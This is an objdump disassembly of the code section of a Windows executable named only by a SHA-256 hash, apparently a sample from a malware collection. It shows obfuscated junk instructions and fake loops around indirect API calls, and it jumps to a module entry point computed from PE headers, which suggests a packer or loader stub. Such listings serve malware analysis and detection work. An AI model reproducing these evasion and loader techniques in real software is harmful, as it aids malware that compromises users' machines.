
411cd75c63967e975b7451416d96c8262ea0dae16a760825dfb97da06b326d5e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0xcc
  401009:	xor    DWORD PTR ds:0x422014,0x420f98
  401013:	push   edi
  401014:	sub    DWORD PTR ds:0x420fb0,0x420e8e
  40101e:	push   0x424545
  401023:	xor    edi,edi
  401025:	and    DWORD PTR ds:0x420efc,0x110f
  40102f:	inc    edi
  401030:	push   edi
  401031:	sbb    DWORD PTR ds:0x420f08,0x51
  40103b:	push   edi
  40103c:	adc    DWORD PTR ds:0x422000,0x3888
  401046:	call   DWORD PTR ds:0x4247ed
  40104c:	test   eax,eax
  40104e:	mov    DWORD PTR ds:0x420e8a,0x96
  401058:	je     0x40106f
  40105e:	xor    eax,eax
  401060:	mov    DWORD PTR ds:0x420ef0,0x42a7
  40106a:	jmp    0x4020ba
  40106f:	push   esi
  401070:	sbb    DWORD PTR ds:0x420e96,ebx
  401076:	mov    esi,DWORD PTR ds:0x4247e9
  40107c:	push   0x8
  40107e:	and    DWORD PTR ds:0x420e96,0x420ef4
  401088:	push   0x424565
  40108d:	sbb    DWORD PTR ds:0x420fa8,0x2663
  401097:	call   esi
  401099:	mov    DWORD PTR ds:0x420f58,0x2539
  4010a3:	test   eax,eax
  4010a5:	mov    DWORD PTR ds:0x420f74,0x63dd
  4010af:	jne    0x401117
  4010b5:	push   0xc
  4010b7:	adc    DWORD PTR ds:0x420efc,0x422010
  4010c1:	push   0x424579
  4010c6:	call   esi
  4010c8:	sbb    DWORD PTR ds:0x422000,0x6696
  4010d2:	test   eax,eax
  4010d4:	jne    0x401117
  4010da:	xor    DWORD PTR ds:0x422010,0x3be2
  4010e4:	push   0x42458d
  4010e9:	adc    DWORD PTR ds:0x420fac,0x420fa0
  4010f3:	push   edi
  4010f4:	push   edi
  4010f5:	call   DWORD PTR ds:0x424819
  4010fb:	add    DWORD PTR ds:0x420e7e,0x14dc
  401105:	test   eax,eax
  401107:	mov    DWORD PTR ds:0x420f08,0x3170
  401111:	je     0x401128
  401117:	xor    eax,eax
  401119:	mov    DWORD PTR ds:0x422014,0x5c19
  401123:	jmp    0x4020b9
  401128:	sbb    esi,DWORD PTR ds:0x420e9a
  40112e:	mov    DWORD PTR [ebp-0x10],0x0
  401135:	and    edi,0x6e17
  40113b:	mov    eax,DWORD PTR [ebp-0x24]
  40113e:	mov    DWORD PTR [ebp-0x24],eax
  401141:	sub    esi,DWORD PTR ds:0x420fa0
  401147:	mov    ecx,0xf89c85b5
  40114c:	mov    DWORD PTR [ebp-0x8],ecx
  40114f:	sub    esi,DWORD PTR ds:0x420f00
  401155:	mov    DWORD PTR [ebp-0xc],0xf89c85b2
  40115c:	sbb    edx,DWORD PTR ds:0x420e92
  401162:	lea    eax,[ebp-0x38]
  401165:	mov    DWORD PTR [ebp-0x2c],eax
  401168:	adc    DWORD PTR ds:0x420f74,edi
  40116e:	lea    eax,[ebp-0x30]
  401171:	xor    esi,esi
  401173:	or     esi,DWORD PTR ds:0x420e9a
  401179:	and    DWORD PTR ds:0x420f64,esi
  40117f:	mov    DWORD PTR [ebp-0x1c],eax
  401182:	sbb    esi,eax
  401184:	mov    eax,ds:0x424435
  401189:	mov    edi,DWORD PTR ds:0x420f48
  40118f:	mov    edx,DWORD PTR ds:0x420f84
  401195:	sub    edx,edi
  401197:	sub    edi,DWORD PTR [edi+edx*1]
  40119a:	mov    eax,DWORD PTR [eax+0x1c8]
  4011a0:	mov    eax,DWORD PTR [eax]
  4011a2:	mov    edx,DWORD PTR [ebp-0x1c]
  4011a5:	movzx  edi,BYTE PTR ds:0x420fb4
  4011ac:	add    DWORD PTR ds:0x420e8a,edi
  4011b2:	mov    esi,0x7510896
  4011b7:	xor    eax,esi
  4011b9:	and    DWORD PTR ds:0x420fa0,0x420e96
  4011c3:	mov    edi,0x3272dd
  4011c8:	add    eax,edi
  4011ca:	mov    DWORD PTR [edx],eax
  4011cc:	mov    DWORD PTR ds:0x420ea2,0x7e11
  4011d6:	mov    eax,ds:0x424675
  4011db:	cmp    eax,0x312bc9f6
  4011e0:	mov    DWORD PTR ds:0x420fa4,0x3707
  4011ea:	jne    0x40133f
  4011f0:	mov    eax,DWORD PTR [ebp-0x8]
  4011f3:	mov    edx,DWORD PTR ds:0x424435
  4011f9:	mov    edx,DWORD PTR [edx+0x198]
  4011ff:	xor    eax,esi
  401201:	add    eax,edi
  401203:	add    DWORD PTR ds:0x422010,0x420eec
  40120d:	mov    DWORD PTR [edx],eax
  40120f:	and    DWORD PTR ds:0x42200c,0x0
  401219:	jmp    0x40122d
  40121e:	xor    edx,edx
  401220:	add    edx,DWORD PTR ds:0x42200c
  401226:	inc    edx
  401227:	mov    DWORD PTR ds:0x42200c,edx
  40122d:	cmp    DWORD PTR ds:0x42200c,0x12
  401234:	jae    0x401276
  40123a:	cmp    DWORD PTR ds:0x42200c,0x5
  401241:	jne    0x401255
  401247:	push   DWORD PTR [ebp-0x18]
  40124a:	push   0x450b
  40124f:	call   DWORD PTR ds:0x4247d5
  401255:	cmp    DWORD PTR ds:0x42200c,0x4
  40125c:	jne    0x401271
  401262:	xor    edx,edx
  401264:	add    edx,DWORD PTR ds:0x42200c
  40126a:	inc    edx
  40126b:	mov    DWORD PTR ds:0x42200c,edx
  401271:	jmp    0x40121e
  401276:	mov    eax,DWORD PTR [ebp-0x8]
  401279:	and    DWORD PTR ds:0x420f70,0x0
  401283:	mov    edx,DWORD PTR ds:0x420f70
  401289:	inc    edx
  40128a:	mov    DWORD PTR ds:0x420f70,edx
  401290:	cmp    DWORD PTR ds:0x420f70,0x7
  401297:	jne    0x4012b0
  40129d:	push   0x5d66
  4012a2:	push   0x420f60
  4012a7:	push   DWORD PTR [ebp-0x14]
  4012aa:	call   DWORD PTR ds:0x4247d9
  4012b0:	cmp    DWORD PTR ds:0x420f70,0x6
  4012b7:	jne    0x4012ca
  4012bd:	mov    edx,DWORD PTR ds:0x420f70
  4012c3:	inc    edx
  4012c4:	mov    DWORD PTR ds:0x420f70,edx
  4012ca:	cmp    DWORD PTR ds:0x420f70,0x14
  4012d1:	jb     0x401283
  4012d7:	and    edx,0x4d07
  4012dd:	xor    eax,esi
  4012df:	movzx  edx,BYTE PTR ds:0x420f08
  4012e6:	sub    edx,DWORD PTR ds:0x420fa0
  4012ec:	mov    DWORD PTR ds:0x420f08,edx
  4012f2:	add    eax,edi
  4012f4:	mov    DWORD PTR ds:0x422008,0x18
  4012fe:	cmp    DWORD PTR ds:0x422008,0x0
  401305:	je     0x40133a
  40130b:	cmp    DWORD PTR ds:0x422008,0x1d
  401312:	jne    0x401328
  401318:	push   0x42406a
  40131d:	push   0x424044
  401322:	call   DWORD PTR ds:0x4247dd
  401328:	mov    edx,DWORD PTR ds:0x422008
  40132e:	dec    edx
  40132f:	mov    DWORD PTR ds:0x422008,edx
  401335:	jmp    0x4012fe
  40133a:	mov    ds:0x424675,eax
  40133f:	mov    eax,ds:0x424435
  401344:	and    DWORD PTR ds:0x420ef4,0x0
  40134e:	mov    edx,DWORD PTR ds:0x420ef4
  401354:	inc    edx
  401355:	mov    DWORD PTR ds:0x420ef4,edx
  40135b:	cmp    DWORD PTR ds:0x420ef4,0x20
  401362:	jne    0x401379
  401368:	push   DWORD PTR [ebp-0x18]
  40136b:	push   0x222d
  401370:	push   DWORD PTR [ebp-0x28]
  401373:	call   DWORD PTR ds:0x4247e1
  401379:	cmp    DWORD PTR ds:0x420ef4,0x12
  401380:	jb     0x40134e
  401386:	mov    eax,DWORD PTR [eax+0x18c]
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	adc    DWORD PTR ds:0x422014,0x7308
  401398:	mov    DWORD PTR [ebp-0x68],eax
  40139b:	and    DWORD PTR ds:0x420e7e,0x0
  4013a5:	xor    eax,eax
  4013a7:	or     eax,DWORD PTR ds:0x420e7e
  4013ad:	inc    eax
  4013ae:	mov    ds:0x420e7e,eax
  4013b3:	cmp    DWORD PTR ds:0x420e7e,0xa
  4013ba:	jne    0x4013d1
  4013c0:	push   DWORD PTR [ebp-0x20]
  4013c3:	push   0x420f74
  4013c8:	push   DWORD PTR [ebp-0x28]
  4013cb:	call   DWORD PTR ds:0x4247e5
  4013d1:	cmp    DWORD PTR ds:0x420e7e,0x9
  4013d8:	jne    0x4013ec
  4013de:	xor    eax,eax
  4013e0:	xor    eax,DWORD PTR ds:0x420e7e
  4013e6:	inc    eax
  4013e7:	mov    ds:0x420e7e,eax
  4013ec:	cmp    DWORD PTR ds:0x420e7e,0x14
  4013f3:	jb     0x4013a5
  4013f9:	mov    DWORD PTR ds:0x420f04,0x16
  401403:	cmp    DWORD PTR ds:0x420f04,0x0
  40140a:	je     0x401438
  401410:	cmp    DWORD PTR ds:0x420f04,0x22
  401417:	jne    0x401423
  40141d:	call   DWORD PTR ds:0x4247f1
  401423:	xor    eax,eax
  401425:	or     eax,DWORD PTR ds:0x420f04
  40142b:	dec    eax
  40142c:	mov    ds:0x420f04,eax
  401431:	jmp    0x401403
  401436:	sub    edx,edx
  401438:	push   ebx
  401439:	or     eax,DWORD PTR ds:0x420f00
  40143f:	mov    ebx,0xf89c85b1
  401444:	and    DWORD PTR ds:0x420fa0,0x0
  40144e:	mov    edx,DWORD PTR ds:0x420fa0
  401454:	inc    edx
  401455:	mov    DWORD PTR ds:0x420fa0,edx
  40145b:	cmp    DWORD PTR ds:0x420fa0,0x8
  401462:	jne    0x40146e
  401468:	call   DWORD PTR ds:0x4247f5
  40146e:	cmp    DWORD PTR ds:0x420fa0,0x7
  401475:	jne    0x40148a
  40147b:	xor    edx,edx
  40147d:	xor    edx,DWORD PTR ds:0x420fa0
  401483:	inc    edx
  401484:	mov    DWORD PTR ds:0x420fa0,edx
  40148a:	cmp    DWORD PTR ds:0x420fa0,0x1e
  401491:	jb     0x40144e
  401497:	and    DWORD PTR ds:0x420e7a,0x0
  4014a1:	jmp    0x4014b3
  4014a6:	mov    edx,DWORD PTR ds:0x420e7a
  4014ac:	inc    edx
  4014ad:	mov    DWORD PTR ds:0x420e7a,edx
  4014b3:	cmp    DWORD PTR ds:0x420e7a,0x14
  4014ba:	jae    0x4014ff
  4014c0:	cmp    DWORD PTR ds:0x420e7a,0x1f
  4014c7:	jne    0x4014f0
  4014cd:	push   0x20c6
  4014d2:	push   DWORD PTR [ebp-0x10]
  4014d5:	push   0x420ea2
  4014da:	push   0x440c
  4014df:	push   DWORD PTR [ebp-0x20]
  4014e2:	push   0x7f92
  4014e7:	push   DWORD PTR [ebp-0x20]
  4014ea:	call   DWORD PTR ds:0x4247f9
  4014f0:	jmp    0x4014a6
  4014f5:	adc    DWORD PTR ds:0x420ea2,0x7cfc
  4014ff:	mov    DWORD PTR [ebp-0x10],ebx
  401502:	sub    DWORD PTR ds:0x420f5c,edi
  401508:	mov    DWORD PTR [ebp-0x10],ebx
  40150b:	mov    DWORD PTR ds:0x420f04,0x12
  401515:	cmp    DWORD PTR ds:0x420f04,0x0
  40151c:	je     0x40156b
  401522:	cmp    DWORD PTR ds:0x420f04,0x5
  401529:	jne    0x40153d
  40152f:	push   DWORD PTR [ebp-0x1c]
  401532:	push   0x424044
  401537:	call   DWORD PTR ds:0x4247fd
  40153d:	cmp    DWORD PTR ds:0x420f04,0x6
  401544:	jne    0x401557
  40154a:	mov    edx,DWORD PTR ds:0x420f04
  401550:	dec    edx
  401551:	mov    DWORD PTR ds:0x420f04,edx
  401557:	xor    edx,edx
  401559:	or     edx,DWORD PTR ds:0x420f04
  40155f:	dec    edx
  401560:	mov    DWORD PTR ds:0x420f04,edx
  401566:	jmp    0x401515
  40156b:	mov    DWORD PTR [ebp-0x10],ebx
  40156e:	and    DWORD PTR ds:0x422004,0x0
  401578:	jmp    0x40158c
  40157d:	xor    edx,edx
  40157f:	xor    edx,DWORD PTR ds:0x422004
  401585:	inc    edx
  401586:	mov    DWORD PTR ds:0x422004,edx
  40158c:	cmp    DWORD PTR ds:0x422004,0x12
  401593:	jae    0x4015bd
  401599:	cmp    DWORD PTR ds:0x422004,0x1e
  4015a0:	jne    0x4015b8
  4015a6:	push   0x424168
  4015ab:	push   0x1
  4015ad:	push   0x0
  4015af:	push   DWORD PTR [ebp-0x14]
  4015b2:	call   DWORD PTR ds:0x424801
  4015b8:	jmp    0x40157d
  4015bd:	mov    DWORD PTR [ebp-0x1c],ecx
  4015c0:	xor    edx,edx
  4015c2:	mov    DWORD PTR [ebp-0x10],ebx
  4015c5:	mov    DWORD PTR ds:0x420e96,0xb45
  4015cf:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  4015d6:	and    DWORD PTR ds:0x422014,0x2ed5
  4015e0:	mov    eax,DWORD PTR [ebp-0x8]
  4015e3:	mov    ecx,DWORD PTR [ebp-0xc]
  4015e6:	xor    edx,edx
  4015e8:	or     edx,DWORD PTR ds:0x420f60
  4015ee:	and    DWORD PTR ds:0x422000,edx
  4015f4:	mov    edx,DWORD PTR [ebp-0xc]
  4015f7:	sbb    DWORD PTR ds:0x420fa0,0x420fb4
  401601:	xor    edx,esi
  401603:	and    DWORD PTR ds:0x420f5c,0x420fa4
  40160d:	xor    ecx,esi
  40160f:	sub    DWORD PTR ds:0x422008,0x420f58
  401619:	add    ecx,edx
  40161b:	sbb    DWORD PTR ds:0x420e8e,edi
  401621:	mov    edx,DWORD PTR [ebp-0xc]
  401624:	xor    DWORD PTR ds:0x420f00,0x7b1e
  40162e:	xor    eax,esi
  401630:	xor    edx,esi
  401632:	or     DWORD PTR ds:0x420e9a,0x7d42
  40163c:	add    eax,edi
  40163e:	lea    ecx,[ecx+edx*1+0x975897]
  401645:	not    DWORD PTR ds:0x420f70
  40164b:	mov    DWORD PTR [ebp-0x18],eax
  40164e:	mov    DWORD PTR ds:0x420e7e,0x57b9
  401658:	cmp    eax,ecx
  40165a:	ja     0x40177e
  401660:	jmp    0x401678
  401665:	mov    eax,ds:0x420f30
  40166a:	mov    ecx,DWORD PTR ds:0x420f38
  401670:	sub    ecx,eax
  401672:	and    eax,DWORD PTR [eax+ecx*1]
  401675:	mov    eax,DWORD PTR [ebp-0x18]
  401678:	mov    ecx,DWORD PTR [ebp-0xc]
  40167b:	sub    DWORD PTR ds:0x422010,0x420f70
  401685:	xor    ecx,esi
  401687:	lea    eax,[ecx+eax*1+0x3272dd]
  40168e:	or     DWORD PTR ds:0x420f70,0x48c8
  401698:	push   eax
  401699:	sub    DWORD PTR ds:0x420e9e,0x506d
  4016a3:	mov    eax,DWORD PTR [ebp-0x1c]
  4016a6:	and    DWORD PTR ds:0x420f5c,0x3822
  4016b0:	xor    eax,esi
  4016b2:	xor    DWORD PTR ds:0x420f74,0x420ef0
  4016bc:	lea    eax,[ebp+eax*1+0x3272e5]
  4016c3:	or     DWORD PTR ds:0x420ea2,0x420f60
  4016cd:	push   eax
  4016ce:	or     DWORD PTR ds:0x420f00,0x5827
  4016d8:	mov    eax,ds:0x424435
  4016dd:	and    DWORD PTR ds:0x420fb4,0x420fa4
  4016e7:	push   DWORD PTR [eax+0x1bc]
  4016ed:	xor    DWORD PTR ds:0x420f98,0x420ea2
  4016f7:	call   0x4020cd
  4016fc:	add    DWORD PTR ds:0x420f68,0x6b04
  401706:	mov    eax,DWORD PTR [ebp-0xc]
  401709:	or     edx,DWORD PTR ds:0x420ef0
  40170f:	mov    ecx,DWORD PTR [ebp-0x18]
  401712:	neg    edx
  401714:	xor    eax,esi
  401716:	sub    edx,0x4f8d
  40171c:	lea    eax,[ecx+eax*1+0x3272dd]
  401723:	mov    ecx,DWORD PTR [ebp-0xc]
  401726:	xor    edx,DWORD PTR ds:0x420e7a
  40172c:	mov    edx,DWORD PTR [ebp-0xc]
  40172f:	xor    edx,esi
  401731:	add    DWORD PTR ds:0x420ef4,0x420e9e
  40173b:	xor    ecx,esi
  40173d:	adc    DWORD PTR ds:0x420e82,0x420f5c
  401747:	add    ecx,edx
  401749:	mov    edx,DWORD PTR [ebp-0xc]
  40174c:	xor    edx,esi
  40174e:	lea    ecx,[ecx+edx*1+0x975897]
  401755:	mov    DWORD PTR ds:0x420e82,0x59f5
  40175f:	mov    DWORD PTR [ebp-0x18],eax
  401762:	mov    DWORD PTR ds:0x420f98,0x3280
  40176c:	cmp    eax,ecx
  40176e:	mov    DWORD PTR ds:0x420fb4,0x7b83
  401778:	jbe    0x401665
  40177e:	and    DWORD PTR ds:0x420f98,0x0
  401788:	mov    ecx,DWORD PTR ds:0x420f98
  40178e:	inc    ecx
  40178f:	mov    DWORD PTR ds:0x420f98,ecx
  401795:	cmp    DWORD PTR ds:0x420f98,0x1e
  40179c:	jne    0x4017b2
  4017a2:	push   0x420fa0
  4017a7:	push   0x4d18
  4017ac:	call   DWORD PTR ds:0x424805
  4017b2:	cmp    DWORD PTR ds:0x420f98,0x18
  4017b9:	jb     0x401788
  4017bf:	mov    eax,DWORD PTR [ebp+0xc]
  4017c2:	sbb    DWORD PTR ds:0x420e7a,edx
  4017c8:	mov    ds:0x4242b9,eax
  4017cd:	and    DWORD PTR ds:0x420f74,0x0
  4017d7:	mov    eax,ds:0x420f74
  4017dc:	inc    eax
  4017dd:	mov    ds:0x420f74,eax
  4017e2:	cmp    DWORD PTR ds:0x420f74,0x1b
  4017e9:	jne    0x40180f
  4017ef:	push   DWORD PTR [ebp-0x1c]
  4017f2:	push   0x420f9c
  4017f7:	push   0x46e8
  4017fc:	push   0x4240e4
  401801:	push   0x1c79
  401806:	push   DWORD PTR [ebp-0xc]
  401809:	call   DWORD PTR ds:0x42480d
  40180f:	cmp    DWORD PTR ds:0x420f74,0x12
  401816:	jb     0x4017d7
  40181c:	mov    eax,DWORD PTR [ebp+0x10]
  40181f:	sub    ecx,DWORD PTR ds:0x420fa4
  401825:	mov    ds:0x42450d,eax
  40182a:	and    DWORD PTR ds:0x422010,0x0
  401834:	mov    eax,ds:0x422010
  401839:	inc    eax
  40183a:	mov    ds:0x422010,eax
  40183f:	cmp    DWORD PTR ds:0x422010,0x18
  401846:	jne    0x401852
  40184c:	call   DWORD PTR ds:0x424811
  401852:	cmp    DWORD PTR ds:0x422010,0x17
  401859:	jb     0x401834
  40185f:	add    ecx,ecx
  401861:	mov    eax,ds:0x4242b9
  401866:	or     DWORD PTR ds:0x420e7a,0x2e1b
  401870:	mov    ecx,DWORD PTR [ebp-0x2c]
  401873:	sub    eax,edi
  401875:	neg    DWORD PTR ds:0x420e92
  40187b:	xor    eax,esi
  40187d:	mov    DWORD PTR ds:0x420fac,0x2c59
  401887:	mov    DWORD PTR [ecx],eax
  401889:	mov    ecx,DWORD PTR [ebp-0x24]
  40188c:	mov    DWORD PTR ds:0x420efc,0x2f09
  401896:	mov    eax,0xf89c85b5
  40189b:	mov    DWORD PTR ds:0x420efc,0x2084
  4018a5:	cmp    ecx,eax
  4018a7:	jne    0x401be5
  4018ad:	xor    DWORD PTR ds:0x422014,0x4966
  4018b7:	lea    eax,[ebp-0x34]
  4018ba:	adc    DWORD PTR ds:0x420e8a,0x420e92
  4018c4:	mov    DWORD PTR [ebp-0x70],eax
  4018c7:	xor    DWORD PTR ds:0x420f74,0x422004
  4018d1:	lea    eax,[ebp+0x4]
  4018d4:	sub    DWORD PTR ds:0x420fa4,0x42200c
  4018de:	mov    DWORD PTR [ebp-0x34],eax
  4018e1:	mov    eax,DWORD PTR [ebp-0x34]
  4018e4:	test   eax,eax
  4018e6:	mov    DWORD PTR ds:0x420e82,0x6242
  4018f0:	je     0x40209d
  4018f6:	xor    DWORD PTR ds:0x422008,0x2d73
  401900:	mov    eax,DWORD PTR [ebp-0x20]
  401903:	mov    eax,DWORD PTR [ebp-0xc]
  401906:	mov    eax,DWORD PTR [ebp-0x8]
  401909:	adc    ecx,0x7834
  40190f:	mov    DWORD PTR [ebp+0xc],eax
  401912:	not    ecx
  401914:	mov    eax,eax
  401916:	mov    eax,ds:0x424435
  40191b:	and    DWORD PTR ds:0x422008,0x0
  401925:	mov    ecx,DWORD PTR ds:0x422008
  40192b:	inc    ecx
  40192c:	mov    DWORD PTR ds:0x422008,ecx
  401932:	cmp    DWORD PTR ds:0x422008,0x1e
  401939:	jne    0x40194a
  40193f:	push   0x422000
  401944:	call   DWORD PTR ds:0x424815
  40194a:	cmp    DWORD PTR ds:0x422008,0x1d
  401951:	jb     0x401925
  401957:	and    DWORD PTR ds:0x420fa0,0x0
  401961:	jmp    0x401973
  401966:	mov    ecx,DWORD PTR ds:0x420fa0
  40196c:	inc    ecx
  40196d:	mov    DWORD PTR ds:0x420fa0,ecx
  401973:	cmp    DWORD PTR ds:0x420fa0,0x14
  40197a:	jae    0x4019bc
  401980:	cmp    DWORD PTR ds:0x420fa0,0x5
  401987:	jne    0x40199d
  40198d:	push   0x2f20
  401992:	push   0x8e83
  401997:	call   DWORD PTR ds:0x4247d5
  40199d:	cmp    DWORD PTR ds:0x420fa0,0x4
  4019a4:	jne    0x4019b7
  4019aa:	mov    ecx,DWORD PTR ds:0x420fa0
  4019b0:	inc    ecx
  4019b1:	mov    DWORD PTR ds:0x420fa0,ecx
  4019b7:	jmp    0x401966
  4019bc:	mov    eax,DWORD PTR [eax+0x1c8]
  4019c2:	neg    DWORD PTR ds:0x420f98
  4019c8:	mov    eax,DWORD PTR [eax]
  4019ca:	sbb    DWORD PTR ds:0x420f74,ebx
  4019d0:	cdq    
  4019d1:	adc    DWORD PTR ds:0x42200c,0x4213
  4019db:	mov    ebx,eax
  4019dd:	mov    DWORD PTR ds:0x420fa4,0x17
  4019e7:	cmp    DWORD PTR ds:0x420fa4,0x0
  4019ee:	je     0x401a74
  4019f4:	cmp    DWORD PTR ds:0x420fa4,0x20
  4019fb:	jne    0x401a14
  401a01:	push   DWORD PTR [ebp-0x1c]
  401a04:	push   0x420e9a
  401a09:	push   0x6482
  401a0e:	call   DWORD PTR ds:0x4247d9
  401a14:	xor    eax,eax
  401a16:	or     eax,DWORD PTR ds:0x420fa4
  401a1c:	dec    eax
  401a1d:	mov    ds:0x420fa4,eax
  401a22:	jmp    0x4019e7
  401a27:	mov    DWORD PTR ds:0x420f08,0x1d
  401a31:	cmp    DWORD PTR ds:0x420f08,0x0
  401a38:	je     0x401a74
  401a3e:	cmp    DWORD PTR ds:0x420f08,0x1e
  401a45:	jne    0x401a5b
  401a4b:	push   0x424027
  401a50:	push   0x4240af
  401a55:	call   DWORD PTR ds:0x4247dd
  401a5b:	xor    eax,eax
  401a5d:	xor    eax,DWORD PTR ds:0x420f08
  401a63:	dec    eax
  401a64:	mov    ds:0x420f08,eax
  401a69:	jmp    0x401a31
  401a6e:	and    DWORD PTR ds:0x420e82,ebx
  401a74:	mov    eax,0xfabdbeed
  401a79:	add    ebx,eax
  401a7b:	inc    ecx
  401a7c:	adc    edx,0xffffffff
  401a7f:	mov    DWORD PTR ds:0x420fa0,0x16
  401a89:	cmp    DWORD PTR ds:0x420fa0,0x0
  401a90:	je     0x401b11
  401a96:	cmp    DWORD PTR ds:0x420fa0,0x20
  401a9d:	jne    0x401ab4
  401aa3:	push   DWORD PTR [ebp-0x10]
  401aa6:	push   0x1d23
  401aab:	push   DWORD PTR [ebp-0x1c]
  401aae:	call   DWORD PTR ds:0x4247e1
  401ab4:	xor    ecx,ecx
  401ab6:	xor    ecx,DWORD PTR ds:0x420fa0
  401abc:	dec    ecx
  401abd:	mov    DWORD PTR ds:0x420fa0,ecx
  401ac3:	jmp    0x401a89
  401ac8:	mov    DWORD PTR ds:0x42200c,0x1c
  401ad2:	cmp    DWORD PTR ds:0x42200c,0x0
  401ad9:	je     0x401b11
  401adf:	cmp    DWORD PTR ds:0x42200c,0x2c
  401ae6:	jne    0x401aff
  401aec:	push   0x87f3
  401af1:	push   0x420f68
  401af6:	push   DWORD PTR [ebp-0xc]
  401af9:	call   DWORD PTR ds:0x4247e5
  401aff:	mov    ecx,DWORD PTR ds:0x42200c
  401b05:	dec    ecx
  401b06:	mov    DWORD PTR ds:0x42200c,ecx
  401b0c:	jmp    0x401ad2
  401b11:	and    DWORD PTR [ebp-0x10],0x0
  401b15:	sbb    DWORD PTR ds:0x422014,ebx
  401b1b:	xor    edx,0x0
  401b1e:	xor    ecx,DWORD PTR ds:0x420f70
  401b24:	mov    DWORD PTR [ebp-0x54],edx
  401b27:	adc    ecx,edx
  401b29:	mov    edx,DWORD PTR [ebp+0xc]
  401b2c:	mov    DWORD PTR [ebp-0x14],edx
  401b2f:	mov    ecx,0x8a29a127
  401b34:	xor    ebx,ecx
  401b36:	dec    edx
  401b37:	add    DWORD PTR [ebp-0x14],eax
  401b3a:	mov    DWORD PTR ds:0x420e96,edi
  401b40:	mov    edx,DWORD PTR [ebp-0x14]
  401b43:	adc    DWORD PTR [ebp-0x10],0xffffffff
  401b47:	or     DWORD PTR ds:0x420f6c,0x420f00
  401b51:	xor    edx,ecx
  401b53:	add    DWORD PTR ds:0x420e86,0x420f04
  401b5d:	mov    DWORD PTR [ebp-0x4c],edx
  401b60:	mov    edx,DWORD PTR [ebp-0x10]
  401b63:	xor    edx,0x0
  401b66:	mov    DWORD PTR [ebp-0x48],edx
  401b69:	mov    DWORD PTR ds:0x420efc,0x3c82
  401b73:	cmp    DWORD PTR [ebp-0x4c],ebx
  401b76:	jne    0x401b92
  401b7c:	mov    DWORD PTR ds:0x420e92,0x5ff4
  401b86:	mov    edx,DWORD PTR [ebp-0x54]
  401b89:	cmp    DWORD PTR [ebp-0x48],edx
  401b8c:	je     0x401bc1
  401b92:	mov    edx,DWORD PTR ds:0x424435
  401b98:	mov    edx,DWORD PTR [edx+0x1c0]
  401b9e:	mov    edx,DWORD PTR [edx]
  401ba0:	xor    ebx,ebx
  401ba2:	add    edx,eax
  401ba4:	adc    ebx,0xffffffff
  401ba7:	xor    edx,ecx
  401ba9:	xor    ebx,0x0
  401bac:	cmp    edx,0x70941fc9
  401bb2:	jne    0x40209d
  401bb8:	cmp    ebx,0xffffffff
  401bbb:	jne    0x40209d
  401bc1:	mov    edx,DWORD PTR ds:0x4244b1
  401bc7:	mov    ebx,DWORD PTR ds:0x4244b9
  401bcd:	xor    edx,ebx
  401bcf:	mov    DWORD PTR ds:0x4244b1,edx
  401bd5:	mov    ebx,DWORD PTR ds:0x4244b1
  401bdb:	mov    edx,DWORD PTR [ebp-0x34]
  401bde:	add    DWORD PTR [edx],ebx
  401be0:	jmp    0x40205e
  401be5:	mov    ecx,DWORD PTR [ebp-0x38]
  401be8:	cmp    ecx,0xf89c85b2
  401bee:	je     0x401c4b
  401bf4:	mov    ecx,DWORD PTR [ebp-0x8]
  401bf7:	mov    edx,DWORD PTR [ebp-0x30]
  401bfa:	xor    ecx,esi
  401bfc:	add    ecx,edi
  401bfe:	cmp    ecx,edx
  401c00:	je     0x401c4b
  401c06:	mov    eax,ds:0x424435
  401c0b:	mov    eax,DWORD PTR [eax+0x194]
  401c11:	mov    ecx,DWORD PTR [eax]
  401c13:	mov    eax,DWORD PTR [ecx+0x3c]
  401c16:	push   DWORD PTR ds:0x42450d
  401c1c:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c20:	push   DWORD PTR ds:0x4242b9
  401c26:	add    eax,ecx
  401c28:	mov    ecx,DWORD PTR ds:0x424435
  401c2e:	mov    ecx,DWORD PTR [ecx+0x194]
  401c34:	push   DWORD PTR [ecx]
  401c36:	call   eax
  401c38:	mov    ecx,DWORD PTR ds:0x424435
  401c3e:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401c44:	mov    DWORD PTR [ecx],eax
  401c46:	jmp    0x40209d
  401c4b:	mov    ecx,DWORD PTR [ebp-0x8]
  401c4e:	mov    edx,DWORD PTR [ebp-0x68]
  401c51:	xor    ecx,esi
  401c53:	add    ecx,edi
  401c55:	cmp    ecx,edx
  401c57:	jne    0x401f61
  401c5d:	mov    ecx,DWORD PTR [ebp-0x8]
  401c60:	mov    edx,DWORD PTR ds:0x424435
  401c66:	mov    edx,DWORD PTR [edx+0x198]
  401c6c:	xor    ecx,esi
  401c6e:	add    ecx,edi
  401c70:	cmp    ecx,DWORD PTR [edx]
  401c72:	jne    0x401c8d
  401c78:	push   eax
  401c79:	mov    eax,DWORD PTR [ebp-0x8]
  401c7c:	xor    eax,esi
  401c7e:	add    eax,edi
  401c80:	push   eax
  401c81:	push   ebx
  401c82:	push   DWORD PTR [ebp-0xc]
  401c85:	push   DWORD PTR [ebp-0x8]
  401c88:	call   0x40772b
  401c8d:	mov    eax,DWORD PTR [ebp-0xc]
  401c90:	mov    DWORD PTR [ebp-0x3c],eax
  401c93:	mov    eax,DWORD PTR [ebp-0x8]
  401c96:	mov    DWORD PTR [ebp-0x18],eax
  401c99:	mov    eax,DWORD PTR [ebp-0x18]
  401c9c:	xor    eax,esi
  401c9e:	add    eax,edi
  401ca0:	mov    DWORD PTR [ebp+0x10],eax
  401ca3:	mov    eax,ds:0x4242b5
  401ca8:	mov    eax,DWORD PTR [eax]
  401caa:	mov    DWORD PTR [ebp+0x10],eax
  401cad:	mov    eax,ds:0x4244bd
  401cb2:	mov    eax,DWORD PTR [eax]
  401cb4:	mov    DWORD PTR [ebp-0x1c],eax
  401cb7:	mov    DWORD PTR [ebp+0xc],0xf89c87b5
  401cbe:	mov    eax,DWORD PTR [ebp+0xc]
  401cc1:	xor    eax,esi
  401cc3:	add    eax,edi
  401cc5:	mov    DWORD PTR [ebp+0xc],eax
  401cc8:	mov    eax,ds:0x424435
  401ccd:	mov    DWORD PTR [ebp+0xc],eax
  401cd0:	mov    eax,DWORD PTR [ebp+0x10]
  401cd3:	mov    DWORD PTR [ebp+0xc],eax
  401cd6:	mov    eax,DWORD PTR [ebp+0xc]
  401cd9:	push   0x4
